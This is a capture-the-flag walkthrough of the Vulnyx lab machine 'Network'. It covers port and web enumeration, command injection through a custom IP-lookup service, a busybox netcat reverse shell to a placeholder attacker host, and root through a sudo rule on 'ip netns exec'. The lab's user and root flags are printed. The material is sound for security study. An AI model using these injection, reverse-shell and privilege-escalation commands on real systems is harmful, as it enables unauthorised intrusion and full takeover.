# Vulnyx: Network

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `nc` |
| **Tags** | `#CommandInjection` `#RCE` `#GTFOBins` `#SudoAbuse` `#NetworkNamespaces` |
| **URL** | https://vulnyx.com/machines/ |

A custom service on port 2222 asks for an IPv4 address and returns network information about it — with no sanitization, letting a semicolon break out into arbitrary command execution. That's enough for a reverse shell. Root comes straight from a `sudo` rule around `ip`, using its documented GTFOBins technique: creating a network namespace and executing a shell inside it.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn network.nyx

PORT     STATE  SERVICE       REASON
22/tcp   open   ssh           syn-ack ttl 64
80/tcp   open   http          syn-ack ttl 64
2222/tcp open   EtherNetIP-1  syn-ack ttl 64
8080/tcp open   http-proxy    syn-ack ttl 64
MAC Address: 08:00:27:6C:87:F7 (Oracle VirtualBox virtual NIC)
```

Four ports are found open: **22 (SSH)**, **80 (HTTP)**, **2222**, and **8080**. A version/script scan against all four fills in the details:

```bash
$ sudo nmap -p 22,80,2222,8080 -sVC network.nyx
PORT     STATE  SERVICE       VERSION
22/tcp   open   ssh           OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open   http          Apache httpd 2.4.67 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.67 (Debian)
2222/tcp open   EtherNetIP-1?
| fingerprint-strings:
|   GenericLines:
|     [93m[i]
|     [97mEnter an IPv4 address to retrieve network information (e.g. 10.10.10.10):
|     [92m
|     [94m[*]
|     [97mRetrieving network information for:
|     [92m
|     [92m
|     [91m
|     INVALID ADDRESS:
|     [92m
|     [92m[+]
|     [97mNetwork information retrieved successfully.
|   NULL:
|     [93m[i]
|     [97mEnter an IPv4 address to retrieve network information (e.g. 10.10.10.10):
|_    [92m
8080/tcp open   http          Apache httpd 2.4.67 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.67 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

### Web Enumeration

Two separate web servers are running:

```
http://network.nyx
```
<img src="../Images/network/Pasted image 20260717154605.png"/>

```
http://network.nyx:8080
```
<img src="../Images/network/Pasted image 20260717154628.png"/>

```bash
$ ffuf -u http://network.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic

index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 41ms]
.html                   [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 73ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 16ms]
.html                   [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 25ms]
server-status           [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 14ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 6666 req/sec :: Duration: [0:08:34] :: Errors: 0 ::
```
```Bash
$ ffuf -u http://network.nyx:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic

index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 41ms]
.html                   [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 73ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 16ms]
.html                   [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 25ms]
server-status           [Status: 403, Size: 316, Words: 21, Lines: 10, Duration: 14ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 6666 req/sec :: Duration: [0:08:34] :: Errors: 0 ::
```

### The Service on 2222

```bash
$ nc network.nyx 2222
[i] Enter an IPv4 address to retrieve network information (e.g. 10.10.10.10): 10.10.10.10
[*] Retrieving network information for: 10.10.10.10...
────────────────────────────────────────────────────────
Address:   10.10.10.10          00001010.00001010.00001010. 00001010
Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
⇒
Network:   10.10.10.0/24        00001010.00001010.00001010. 00000000
HostMin:   10.10.10.1           00001010.00001010.00001010. 00000001
HostMax:   10.10.10.254         00001010.00001010.00001010. 11111110
Broadcast: 10.10.10.255         00001010.00001010.00001010. 11111111
Hosts/Net: 254                  Class A, Private Internet

[+] Network information retrieved successfully.
```

## Initial Access

### Command Injection → RCE

The prompt reads an IP address and does something with it server-side — worth testing whether that input reaches a shell unsanitized. Appending a semicolon and a command confirms it does:

```bash
$ nc network.nyx 2222
[i] Enter an IPv4 address to retrieve network information (e.g. 10.10.10.10): 10.10.10.10;id
[*] Retrieving network information for: 10.10.10.10;id...
────────────────────────────────────────────────────────
Address:   10.10.10.10          00001010.00001010.00001010. 00001010
Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
⇒
Network:   10.10.10.0/24        00001010.00001010.00001010. 00000000
HostMin:   10.10.10.1           00001010.00001010.00001010. 00000001
HostMax:   10.10.10.254         00001010.00001010.00001010. 11111110
Broadcast: 10.10.10.255         00001010.00001010.00001010. 11111111
Hosts/Net: 254                  Class A, Private Internet

uid=1000(net) gid=1000(net) groups=1000(net)

[+] Network information retrieved successfully.
```

The same syntax is reused to get a reverse shell instead of a one-off command:

```bash
$ nc network.nyx 2222
[i] Enter an IPv4 address to retrieve network information (e.g. 10.10.10.10): 10.10.10.10;busybox nc <ATTACKER_IP> <PORT> -e /bin/sh
[*] Retrieving network information for: 10.10.10.10;busybox nc <ATTACKER_IP> <PORT> -e /bin/sh...
────────────────────────────────────────────────────────
Address:   10.10.10.10          00001010.00001010.00001010. 00001010
Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
⇒
Network:   10.10.10.0/24        00001010.00001010.00001010. 00000000
HostMin:   10.10.10.1           00001010.00001010.00001010. 00000001
HostMax:   10.10.10.254         00001010.00001010.00001010. 11111110
Broadcast: 10.10.10.255         00001010.00001010.00001010. 11111111
Hosts/Net: 254                  Class A, Private Internet
```

### Shell as net

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [network.nyx] 33118
id
uid=1000(net) gid=1000(net) groups=1000(net)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
net@network:~$ id
uid=1000(net) gid=1000(net) groups=1000(net)
net@network:~$ ls -l /home/net
total 4
-r-------- 1 net net 33 Jul  9 16:13 user.txt
net@network:~$ cat /home/net/user.txt
ed57ab104e04339fcc95e35865eb1e79
```

> **User flag:** `ed57ab104e04339fcc95e35865eb1e79`

## Privilege Escalation

### `sudo ip netns`

```bash
net@network:~$ sudo -l
Matching Defaults entries for net on network:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User net may run the following commands on network:
    (root) NOPASSWD: /usr/bin/ip
```

> **Resource:** `https://gtfobins.org/gtfobins/ip/`

`ip` has a documented GTFOBins technique built around network namespaces: creating one and executing a shell inside it (`ip netns exec`) requires elevated capabilities that the process already has when run via `sudo` — and the resulting shell keeps those privileges instead of being confined to the namespace's own isolation:

```bash
net@network:~$ sudo ip netns add foo
net@network:~$ sudo ip netns exec foo /bin/sh -p
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -l /root
total 4
-r-------- 1 root root 33 Jul  9 16:15 root.txt
# cat /root/root.txt
6881d504c6a19cd5d15dddfc9745e026
```

> **Root flag:** `6881d504c6a19cd5d15dddfc9745e026`

## Takeaways

- Any custom service that takes user input and "does something" with it server-side is worth probing for command injection directly — a semicolon, backtick, or pipe is often all it takes when input isn't sanitized before reaching a shell.
- GTFOBins is worth checking the moment `sudo -l` shows anything beyond the most common binaries — `ip` isn't an obvious privilege escalation target on its own, but its namespace-handling features are.
- Network namespace manipulation (`ip netns`) requires meaningful privileges to begin with, which is exactly why granting it through `sudo` is equivalent to granting root outright.